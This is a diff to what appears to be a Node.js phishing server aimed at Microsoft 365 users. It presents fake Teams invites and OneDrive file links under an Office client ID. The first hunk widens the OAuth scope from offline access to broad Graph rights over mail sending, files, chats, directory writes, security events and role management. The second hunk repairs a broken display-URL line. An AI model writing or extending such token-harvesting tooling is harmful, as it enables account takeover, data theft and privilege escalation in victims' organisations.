@@ -18,8 +18,18 @@ const DEFAULT_CLIENT_ID = CLIENT_IDS.office;
 
 const TENANT   = 'common';
 const RESOURCE = 'https://graph.microsoft.com';
-const SCOPE    = 'offline_access';
-
+const SCOPE = 'offline_access ' +
+              'openid profile email ' +
+              'User.Read.All Directory.Read.All ' +
+              'Sites.Read.All Sites.ReadWrite.All Sites.Manage.All ' +
+              'Files.Read.All Files.ReadWrite.All ' +
+              'Mail.Read Mail.ReadWrite Mail.Send ' +
+              'Calendars.Read Calendars.ReadWrite ' +
+              'Chats.Read Chats.ReadWrite ChatMessage.Read ChatMessage.Send ' +
+              'TeamSettings.ReadWrite.All TeamsAppInstallation.ReadWriteForTeam ' +
+              'SecurityEvents.Read.All SecurityEvents.ReadWrite.All ' +
+              'Directory.ReadWrite.All Group.ReadWrite.All ' +
+              'RoleManagement.ReadWrite.Directory';
 // Fake/display URLs for different modes
 const DISPLAY_BASES = {
   teams:    'https://teams.microsoft.com/invite/',
@@ -322,7 +332,7 @@ const server = http.createServer(async (req, res) => {
         displayNote = 'Teams secure invite';
       } else if (reqLower === 'onedrive') {
         displayFilename = 'secured-onedrive-document.pdf';
-        displayUrl = `${DISPconst SCOPELAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
+        displayUrl = `${DISPLAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
         displayNote = 'OneDrive shared file';
       }
       else if (reqLower === 'csa') {
